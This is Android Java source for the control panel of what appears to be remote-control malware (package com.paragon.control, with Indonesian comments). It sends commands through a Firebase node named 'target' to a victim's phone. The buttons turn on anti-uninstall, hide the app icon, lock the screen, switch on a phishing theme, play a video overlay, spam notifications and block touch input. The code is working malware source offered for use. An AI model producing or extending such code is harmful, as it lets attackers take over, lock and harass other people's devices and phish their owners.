package com.paragon.control;

import android.os.Bundle;
import android.widget.Button;
import android.widget.Switch;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mDatabase = FirebaseDatabase.getInstance().getReference("target");

        // Inisialisasi tombol dan switch dari layout terbaru
        Switch swAntiUninstall = findViewById(R.id.swAntiUninstall);
        Button btnGanti = findViewById(R.id.btnGanti);
        Switch swFlashlight = findViewById(R.id.swFlashlight);
        Switch swLockLow = findViewById(R.id.swLockLow);
        Switch swLockCustom = findViewById(R.id.swLockCustom);
        Button btnTemaPhising = findViewById(R.id.btnTemaPhising);
        Switch swHideIcon = findViewById(R.id.swHideIcon);
        Button btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
        Button btnSpamNotif = findViewById(R.id.btnSpamNotif);
        Button btnStuckLayar = findViewById(R.id.btnStuckLayar);

        // 1. Anti Uninstall
        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("antiUninstall").setValue(isChecked);
            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // 2. GANTI
        btnGanti.setOnClickListener(v -> {
            Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show();
        });

        // 3. Flashlight
        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("flashlight").setValue(isChecked);
            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // 4. Lock low
        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockLow").setValue(isChecked);
            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // 5. Lock Custom V2
        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockCustom").setValue(isChecked);
            Toast.makeText(this, "Lock Custom V2: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // 6. Tema Phising
        btnTemaPhising.setOnClickListener(v -> {
            mDatabase.child("temaPhising").setValue("TAP, GANTI ICON");
            Toast.makeText(this, "Tema Phising: GANTI ICON", Toast.LENGTH_SHORT).show();
        });

        // 7. Hide Icon
        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("hideIcon").setValue(isChecked);
            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // 8. Video Overlay
        btnVideoOverlay.setOnClickListener(v -> {
            mDatabase.child("videoOverlay").setValue("TAP, PLAY VIDEO");
            Toast.makeText(this, "Video Overlay: PLAY VIDEO", Toast.LENGTH_SHORT).show();
        });

        // 9. Spam Notifikasi
        btnSpamNotif.setOnClickListener(v -> {
            mDatabase.child("spamNotif").setValue("TAP, SPAM DIALOG");
            Toast.makeText(this, "Spam Notifikasi: SPAM DIALOG", Toast.LENGTH_SHORT).show();
        });

        // 10. Stuck Layar
        btnStuckLayar.setOnClickListener(v -> {
            mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
            Toast.makeText(this, "Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
        });
    }
}
